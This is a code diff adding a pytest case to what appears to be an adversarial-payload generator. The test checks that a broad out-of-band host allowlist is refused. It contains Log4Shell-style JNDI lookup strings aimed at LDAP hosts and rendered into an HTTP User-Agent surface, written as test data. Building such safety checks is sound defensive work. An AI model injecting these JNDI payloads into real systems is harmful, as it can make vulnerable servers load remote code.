@@ -373,6 +373,26 @@ class TestSafety:
         assert normalize_oob_host("abc.github.io") == "abc.github.io"
         assert normalize_oob_host("127.0.0.1") == "127.0.0.1"
 
+    def test_render_for_surface_carrier_check_uses_the_same_oob_contract(self):
+        # The carrier defense-in-depth layer must apply the SAME OOB contract as the safety
+        # boundary — a broad oob_host (bare TLD/public suffix) must not widen its allowlist.
+        with pytest.raises(ap.AdversarialPayloadSafetyError):
+            ap.render_for_surface(
+                "EFORGE_TEST ${jndi:ldap://sub.co.uk/EFORGE_TEST}",
+                "http_user_agent",
+                "log4shell",
+                "s",
+                oob_hosts=("co.uk",),
+            )
+        # a concrete registered OOB host still renders fine (subdomain under it allowed)
+        ap.render_for_surface(
+            "EFORGE_TEST ${jndi:ldap://sub.oast.fun/EFORGE_TEST}",
+            "http_user_agent",
+            "log4shell",
+            "s",
+            oob_hosts=("oast.fun",),
+        )
+
 
 class TestNormalizeOobHosts:
     """The --oob-host boundary contract shared by `eforge generate` and `eforge validate`."""
